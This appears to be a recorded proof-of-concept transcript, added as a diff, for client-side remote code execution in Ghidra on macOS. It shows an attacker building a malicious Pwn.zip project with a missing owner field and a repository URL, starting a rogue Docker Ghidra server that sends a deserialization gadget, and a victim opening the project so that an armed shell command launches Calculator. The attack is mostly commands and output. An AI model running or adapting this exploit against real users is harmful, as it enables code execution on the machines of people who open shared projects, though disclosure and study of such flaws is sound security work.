@@ -1,0 +1,118 @@
+===============================================================================
+ Ghidra client-side RCE via malicious project open (Pwn.zip → pop Calculator)
+ untargeted: Pwn.zip is built once and works against ANY macOS user.
+ recorded on macOS 25.4.0 / Darwin arm64, 2026-04-16
+===============================================================================
+
+---------------------------------------------------------------
+ step 1 · attacker: build Pwn.zip (no username needed)
+---------------------------------------------------------------
+
+$ cd poc/poc
+$ ./build.sh 127.0.0.1 13100 'touch /tmp/PWNED-univ; open -a Calculator' \
+             --out /tmp/Pwn.zip
+[+] seeding skeleton project via analyzeHeadless
+[+] wrote PoC: /tmp/Pwn.zip
+    attacker host : 127.0.0.1
+    attacker port : 13100
+    victim owner  : <any>   (project.prp has no OWNER; defaults to victim's $USER)
+    command armed : touch /tmp/PWNED-univ; open -a Calculator
+
+$ unzip -p /tmp/Pwn.zip EvilProject.rep/projectState
+<?xml version="1.0" encoding="UTF-8"?>
+<PROJECT>
+    <OPEN_REPOSITORY_VIEW URL="ghidra://127.0.0.1:13100/Pwn" />
+    <TOOL_MANAGER ACTIVE_WORKSPACE="Workspace">
+        <WORKSPACE NAME="Workspace" ACTIVE="true" />
+    </TOOL_MANAGER>
+</PROJECT>
+
+$ unzip -p /tmp/Pwn.zip EvilProject.rep/project.prp
+<?xml version="1.0" encoding="UTF-8"?>
+<FILE_INFO>
+    <BASIC_INFO>
+    </BASIC_INFO>
+</FILE_INFO>
+
+# Note: NO <STATE NAME="OWNER" .../> element.  DefaultProjectData.java:307
+#       --  owner = properties.getString(OWNER, getUserName());  --
+#       defaults `owner` to the current user's username when the property
+#       is absent, so isOwner(owner) trivially returns true for whoever
+#       opens the project.
+
+
+---------------------------------------------------------------
+ step 2 · attacker: start the rogue Ghidra Server in Docker
+---------------------------------------------------------------
+
+$ cd poc/poc
+$ CMD='touch /tmp/PWNED-univ; open -a Calculator' PORT=13100 \
+      docker compose -f docker/compose.yaml up -d
+ Container evil-ghidra-server Created
+ Container evil-ghidra-server Started
+
+$ docker logs evil-ghidra-server
+[evil] command: touch /tmp/PWNED-univ; open -a Calculator
+[evil] evil registry listening on :13100 (SSL JRMP)
+[evil] ssl probe listener on :13101
+
+
+---------------------------------------------------------------
+ step 3 · victim: extract the zip and open the project
+---------------------------------------------------------------
+
+(user receives Pwn.zip — email attachment, Slack DM, AirDrop, shared drive,
+ `git clone` a repo containing the project tree, etc.)
+
+$ cd ~/Downloads
+$ unzip Pwn.zip
+  inflating: EvilProject.gpr
+  inflating: EvilProject.rep/projectState
+  inflating: EvilProject.rep/project.prp
+  ...
+
+# User double-clicks EvilProject.gpr, or inside Ghidra uses
+# File → Open Project → ~/Downloads/EvilProject.gpr
+
+(headless reproduction of the same code path; runs as the current macOS
+ user with no owner matching:  $USER = calif, but project.prp has no OWNER
+ so Ghidra accepts it unconditionally)
+
+$ analyzeHeadless /tmp/vh-test Host \
+      -scriptPath /tmp/scriptdir \
+      -preScript OpenProjectVictim.java /tmp/victim-test EvilProject \
+      -noanalysis -deleteProject
+
+INFO  Opening project: /tmp/victim-test/EvilProject (DefaultProject)
+ERROR Error restoring project /tmp/victim-test/EvilProject
+java.lang.ClassCastException: class org.python.core.PySingleton cannot be cast to class java.lang.Integer
+  at java.rmi/sun.rmi.registry.RegistryImpl_Stub.list(RegistryImpl_Stub.java:95)
+  at ghidra.framework.client.ServerConnectTask.checkServerBindNames(ServerConnectTask.java:430)
+  at ghidra.framework.client.ServerConnectTask.getGhidraServerHandle(ServerConnectTask.java:173)
+  at ghidra.framework.client.ServerConnectTask.getRepositoryServerHandle(ServerConnectTask.java:243)
+  at ghidra.framework.client.ServerConnectTask.run(ServerConnectTask.java:80)
+  at ghidra.framework.project.DefaultProject.openProjectView(DefaultProject.java:259)
+  at ghidra.framework.project.DefaultProject.addProjectView(DefaultProject.java:297)
+  at ghidra.framework.project.DefaultProject.restore(DefaultProject.java:493)
+  at ghidra.framework.project.DefaultProjectManager.openProject(DefaultProjectManager.java:134)
+
+
+---------------------------------------------------------------
+ step 4 · victim: Calculator.app is running as the victim user
+---------------------------------------------------------------
+
+$ ps -A | grep -i '[C]alculator'
+15493 ??         0:00.39 /System/Applications/Calculator.app/Contents/MacOS/Calculator
+
+$ ls -la /tmp/PWNED-univ
+-rw-r-----  1 calif  wheel  0 16 Apr 15:24 /tmp/PWNED-univ
+
+$ docker logs evil-ghidra-server
+[evil] command: touch /tmp/PWNED-univ; open -a Calculator
+[evil] evil registry listening on :13100 (SSL JRMP)
+[evil] ssl probe listener on :13101
+[evil] jrmp connect from /192.168.65.1:50455
+[evil]   magic=0x4a524d49 ver=2 proto=0x4b
+[evil]   sending gadget as ReturnData
+[evil]   payload sent
+
